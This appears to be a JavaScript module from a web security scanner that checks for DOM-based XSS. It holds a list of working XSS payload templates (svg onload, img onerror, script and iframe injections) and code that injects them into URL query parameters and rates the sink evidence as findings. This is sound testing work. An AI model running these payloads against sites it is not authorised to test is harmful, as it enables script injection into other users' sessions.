/**
 * DOM XSS verification — gera plano de execução para Playwright (sem
 * acoplar nada do navegador aqui).
 *
 * Estratégia:
 *   1. Para cada URL/parâmetro candidato, gera N payloads únicos com marker
 *      previsível (`__GR_XSS_<hash>__`).
 *   2. Caller (browser-driver injetado) navega, executa, e relata se o
 *      marker apareceu em `eval`/`innerHTML`/`document.write`/etc.
 *   3. Lógica aqui: gerar payloads, parsear evidência, emitir findings.
 */

import crypto from 'node:crypto';

const SINK_NAMES = ['eval', 'Function', 'innerHTML', 'outerHTML', 'document.write', 'document.writeln', 'setTimeout', 'setInterval', 'location.href', 'window.open'];

export function uniqueMarker(seed = '') {
  const h = crypto.createHash('sha1').update(`${seed}::${Math.random()}`).digest('hex').slice(0, 10);
  return `__GR_XSS_${h}__`;
}

const TEMPLATES = [
  // marker é colocado dentro de cada payload — quando executa, deve aparecer no console
  '<svg/onload=alert("{m}")>',
  '"><svg/onload=alert("{m}")>',
  '\'-alert("{m}")-\'',
  'javascript:alert("{m}")',
  '"><img src=x onerror=alert("{m}")>',
  '\'-confirm("{m}")-\'',
  '"};alert("{m}");//',
  '<script>alert("{m}")</script>',
  '<iframe srcdoc="<script>alert(\'{m}\')</script>">',
];

export function buildPayloads(seed = '') {
  const m = uniqueMarker(seed);
  const payloads = TEMPLATES.map((t, i) => ({
    id: `${m}#${i}`,
    marker: m,
    payload: t.replace('{m}', m),
    template: t,
  }));
  return { marker: m, payloads };
}

/**
 * Gera plano completo: para cada URL+param, instancia payloads.
 * `params` = lista de nomes de query params (ou nome único).
 */
export function buildVerificationPlan({ urls = [], params = ['q'], maxPerUrl = 6 } = {}) {
  const plan = [];
  for (const url of urls) {
    for (const param of params) {
      const { marker, payloads } = buildPayloads(`${url}?${param}`);
      for (const p of payloads.slice(0, maxPerUrl)) {
        const u = injectParam(url, param, p.payload);
        plan.push({ url: u, base: url, param, marker, payloadId: p.id, template: p.template });
      }
    }
  }
  return plan;
}

function injectParam(url, param, value) {
  try {
    const u = new URL(url);
    u.searchParams.set(param, value);
    return u.toString();
  } catch {
    const sep = url.includes('?') ? '&' : '?';
    return `${url}${sep}${encodeURIComponent(param)}=${encodeURIComponent(value)}`;
  }
}

/**
 * Avalia o relatório do browser-driver:
 *   evidence = [
 *     { sink: 'innerHTML', value: '...marker...', stack: '...' },
 *     { sink: 'console', value: '...' },
 *   ]
 *
 * Retorna findings high/critical somente quando marker bate em sink real.
 */
export function evaluateEvidence(plan, browserReports) {
  const findings = [];
  for (let i = 0; i < plan.length; i++) {
    const slot = plan[i];
    const report = browserReports[i] || {};
    const evidence = Array.isArray(report.evidence) ? report.evidence : [];
    const realHit = evidence.find((e) =>
      String(e.value || '').includes(slot.marker) && SINK_NAMES.some((s) => s === e.sink || String(e.sink || '').toLowerCase().includes(s.toLowerCase())),
    );
    const consoleHit = evidence.find((e) => e.sink === 'console' && String(e.value || '').includes(slot.marker));
    const dialogHit = evidence.find((e) => /dialog|alert|confirm|prompt/i.test(String(e.sink || '')) && String(e.value || '').includes(slot.marker));
    if (realHit || dialogHit) {
      findings.push({
        severity: 'high', category: 'xss-dom-confirmed',
        title: `XSS DOM confirmado: ${slot.base}?${slot.param}=…`,
        description: `Marker ${slot.marker} apareceu em sink ${realHit?.sink || dialogHit?.sink}. Payload: ${slot.template}`,
        evidence: { url: slot.url, base: slot.base, param: slot.param, payload: slot.template, sink: realHit?.sink || dialogHit?.sink, hit: realHit || dialogHit },
      });
    } else if (consoleHit) {
      findings.push({
        severity: 'low', category: 'xss-dom-reflected',
        title: `Reflexão sem execução em ${slot.base}?${slot.param}`,
        description: `Marker reflete em DOM mas não executa em sink — possível filtro/encoding ativo.`,
        evidence: { url: slot.url, payload: slot.template },
      });
    }
  }
  return findings;
}
